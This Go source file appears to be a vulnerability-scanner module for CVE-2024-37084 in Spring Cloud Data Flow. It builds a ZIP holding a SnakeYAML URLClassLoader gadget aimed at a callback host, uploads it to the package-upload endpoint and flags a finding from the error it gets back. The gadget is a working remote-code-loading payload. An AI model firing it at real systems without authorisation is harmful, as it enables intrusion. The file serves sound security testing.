package cve

// CVE-2024-37084: Spring Cloud Data Flow RCE via package upload
// Malicious ZIP with SnakeYAML gadget in YAML triggers deserialization on upload

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
	"github.com/springhawk/springhawk/pkg/utils"
)

func init() { vulns.RegisterRemote(&DataFlowRCE{}) }

type DataFlowRCE struct{}

func (m *DataFlowRCE) ID() string          { return "CVE-2024-37084" }
func (m *DataFlowRCE) Name() string        { return "Spring Cloud Data Flow Package Upload RCE" }
func (m *DataFlowRCE) CVSS() float64       { return 9.8 }
func (m *DataFlowRCE) Severity() models.Severity { return models.SeverityCritical }
func (m *DataFlowRCE) Tags() []string      { return []string{"rce", "deserialization", "snakeyaml", "spring-cloud", "dataflow"} }
func (m *DataFlowRCE) Requirements() vulns.ModuleRequirements {
	return vulns.ModuleRequirements{RequiresSpringCloud: true}
}
func (m *DataFlowRCE) Description() string {
	return "Spring Cloud Data Flow deserializes YAML within uploaded ZIP packages, triggering SnakeYAML gadget RCE."
}

func (m *DataFlowRCE) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	pkgURL := utils.JoinURL(target.BaseURL, "api/package/")
	resp, err := client.Get(ctx, pkgURL, nil)
	if err != nil || resp.StatusCode != 200 {
		return nil, nil
	}
	if !strings.Contains(resp.BodyString, "_links") || !strings.Contains(resp.BodyString, "upload") {
		return nil, nil
	}

	// Build malicious ZIP with SnakeYAML gadget (OAST probe - uses a DNS callback)
	dnslog := "springhawk-check.invalid"
	if target.CallbackHost != "" {
		dnslog = target.CallbackHost
	}
	yamlContent := fmt.Sprintf("kind: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://%s\"]]]]\n", dnslog)

	var zipBuf bytes.Buffer
	w := zip.NewWriter(&zipBuf)
	f, _ := w.Create("package.yaml")
	f.Write([]byte(yamlContent)) //nolint:errcheck
	w.Close()

	zipBytes := zipBuf.Bytes()
	byteSlice := make([]interface{}, len(zipBytes))
	for i, b := range zipBytes {
		byteSlice[i] = int(b)
	}
	payload, _ := json.Marshal(map[string]interface{}{"data": byteSlice})

	uploadURL := utils.JoinURL(target.BaseURL, "api/package/upload")
	uploadResp, err := client.Post(ctx, uploadURL, "application/json",
		strings.NewReader(string(payload)), nil)
	if err != nil {
		return nil, nil
	}

	// Vulnerable: SnakeYAML constructor exception triggered
	if !strings.Contains(uploadResp.BodyString, "ConstructorException") &&
		!strings.Contains(uploadResp.BodyString, "snakeyaml") {
		return nil, nil
	}

	finding := &models.Finding{
		ID:          fmt.Sprintf("%s-%d", m.ID(), time.Now().UnixNano()),
		Type:        models.FindingTypeVuln,
		Severity:    m.Severity(),
		CVSS:        m.CVSS(),
		CVEIDs:      []string{"CVE-2024-37084"},
		Title:       "Spring Cloud Data Flow: SnakeYAML Gadget RCE via Package Upload",
		Description: m.Description(),
		URL:         target.BaseURL,
		Endpoint:    "/api/package/upload",
		Method:      "POST",
		Evidence:    "SnakeYAML ConstructorException in response — YAML deserialization gadget triggered.",
		Remediation: "Upgrade Spring Cloud Data Flow to 2.11.4+. Validate package contents before deserialization.",
		References:  []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-37084"},
		Tags:        m.Tags(),
		Timestamp:   time.Now(),
		ModuleID:    m.ID(),
	}
	return []*models.Finding{finding}, nil
}

func (m *DataFlowRCE) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.Check(ctx, target, client)
}
